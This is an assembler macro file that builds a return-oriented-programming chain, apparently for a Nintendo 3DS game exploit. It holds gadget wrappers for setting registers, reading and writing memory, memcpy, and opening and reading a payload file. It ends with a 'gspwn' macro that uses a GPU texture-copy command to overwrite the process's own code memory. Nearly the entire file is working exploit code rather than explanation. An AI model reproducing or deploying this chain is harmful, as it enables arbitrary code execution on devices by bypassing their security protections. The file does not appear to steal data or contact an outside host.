.macro NOP
    .word STEEL_ROP_NOP
.endmacro

.macro garbage
    .word 0xDEADBEEF
.endmacro

.macro setR0, r0
    .word STEEL_ROP_POP_R0PC
        .word r0 ; r0
        NOP ; pc
.endmacro

.macro setR1, r1
    .word STEEL_ROP_POP_R1PC
        .word r1 ; r1
        NOP ; pc
.endmacro

.macro setLR, lr
    setR1 STEEL_ROP_NOP
    .word STEEL_ROP_POP_R4LR_BX_R1
        garbage ; r4
        .word lr ; lr
.endmacro

.macro setR4, r4
    setLR STEEL_ROP_NOP
    .word STEEL_ROP_POP_R4_BX_LR
        .word r4 ; r4
.endmacro

.macro svcSleepThread, nanoLow, nanoHigh
    setLR STEEL_ROP_NOP
    setR0 nanoLow
    setR1 nanoHigh
    .word STEEL_SVC_SLEEPTHREAD
.endmacro

.macro dereferenceR0ToR0
    setLR STEEL_ROP_NOP
    .word STEEL_ROP_LDR_R0R0_BX_LR
.endmacro

.macro dereferenceAddressToR0, address
    setR0 address
    dereferenceR0ToR0
.endmacro

.macro compareR0, value
    setR4 value
    .word STEEL_ROP_CMP_R0R4_MOVEQ_R0_1_MOVNE_R0_0_POP_R4PC
        garbage ; r4
        NOP ; pc
.endmacro

.macro storeToAddressIfEqual, address, value
    setLR STEEL_ROP_NOP
    setR1 value
    setR0 address
    .word STEEL_ROP_STREQ_R1_R0_BX_LR
.endmacro

.macro storeValue, address, value
    setR0 value
    setR1 address
    .word STEEL_ROP_STR_R0_R1_POP_R4PC
        garbage ; r4
        NOP ; PC
.endmacro

.macro addToR0, value
    setLR STEEL_ROP_NOP
    setR1 value
    .word STEEL_ROP_ADD_R0R0R1_BX_LR
.endmacro

.macro storeR0, address
    setR1 address
    .word STEEL_ROP_STR_R0_R1_POP_R4PC
        garbage ; r4
        NOP ; PC
.endmacro

.macro memcpy, dst, src, size
    setLR STEEL_ROP_NOP
    setR0 dst
    setR1 src
    .word STEEL_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
        .word size ; r2 (addr)
        .word 0xDEADC0DE ; r3 (garbage)
        .word 0xDEADC0DE ; r4 (garbage)
        .word 0xDEADC0DE ; r5 (garbage)
        .word 0xDEADC0DE ; r6 (garbage)
    .word STEEL_MEMCPY
.endmacro

.macro FSUSER_OpenFileDirectly,fileHandle,transaction,archiveId,archivePathType,archivePath,archivePathLength,filePathType,filePath,filePathLength,openflags,attributes
    setLR attributes
    setR0 STEEL_FSUSER_HANDLE
    setR1 archivePathLength

    .word STEEL_ROP_POP_R2R3R4R5R6PC
        .word transaction
        .word archiveId
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F

    .word STEEL_ROP_POP_R4R5R6R7R8R9R10R11R12PC
        .word 0xF00FF00F        ;r4
        .word archivePath       ;r5
        .word filePath          ;r6
        .word 0xF00FF00F        ;r7
        .word 0xF00FF00F        ;r8
        .word archivePathType   ;r9
        .word filePathType      ;r10
        .word openflags         ;r11
        .word filePathLength    ;r12

    .word STEEL_FSUSER_OPENFILEDIRECTLY+0x24
        .word 0xF00FF00F
        .word fileHandle
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
.endmacro

.macro FSFILE_GetSize,filehandle,size_out
    setLR STEEL_ROP_NOP
    setR0 filehandle
    setR1 size_out
    .word STEEL_FSFILE_GETSIZE
.endmacro

.macro FSFILE_Read,filehandle,bytesread,offset_l,offset_h,buffer,size_ptr
    memcpy @@readfile_size,size_ptr,4

    setR0 filehandle
    setR1 buffer
    .word STEEL_ROP_POP_R2R3R4R5R6PC
        .word offset_l
        .word offset_h
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
    .word STEEL_ROP_POP_R4R5R6R7R8R9R10R11R12PC
        .word 0xF00FF00F        ;r4
        .word bytesread         ;r5
        .word 0xF00FF00F        ;r6
        .word 0xF00FF00F        ;r7
        .word 0xF00FF00F        ;r8
        .word 0xF00FF00F        ;r9
        .word 0xF00FF00F        ;r10
        .word 0xF00FF00F        ;r11
@@readfile_size:
        .word 0xF00FF00F        ;r12, to be overwritten
    .word STEEL_FSFILE_READ+0x10
        .word 0xF00FF00F
        .word 0xF00FF00F
        .word 0xF00FF00F
.endmacro

.macro FSFILE_Close,filehandle
    setLR STEEL_ROP_NOP
    setR0 filehandle
    .word STEEL_FSFILE_CLOSE
.endmacro

.macro flush_dcache, addr, size
    setLR STEEL_ROP_NOP
    setR0 STEEL_GSPGPU_HANDLE
    setR1 0xFFFF8001
    .word STEEL_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
        .word addr ; r2 (addr)
        .word size ; r3 (src)
        .word 0xDEADC0DE ; r4 (garbage)
        .word 0xDEADC0DE ; r5 (garbage)
        .word 0xDEADC0DE ; r6 (garbage)
    .word STEEL_GSPGPU_FLUSHDATACACHE
.endmacro

.macro gspwn,code_linear_base_ptr,VA,src,size
    dereferenceAddressToR0 code_linear_base_ptr
    addToR0 VA
    setR1 @@gxCommandPayload+0x8 ; overwrite destination
    .word STEEL_ROP_STR_R0_R1_POP_R4PC
        garbage
        NOP
    setLR STEEL_ROP_POP_R4R5R6R7R8R9R10R11PC
    setR0 STEEL_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 : nn__gxlow__CTR__detail__GetInterruptReceiver
    setR1 @@gxCommandPayload ; r1 : cmd addr
    .word STEEL_GSPGPU_GXTRYENQUEUE
        @@gxCommandPayload:
        .word 0x00000004 ; command header (SetTextureCopy)
        .word src ; source address
        .word 0xDEADC0DE ; destination address overwritten before (standin, will be filled in)
        .word size ; size
        .word 0xFFFFFFFF ; dim in
        .word 0xFFFFFFFF ; dim out
        .word 0x00000008 ; flags
        .word 0x00000000 ; unused
.endmacro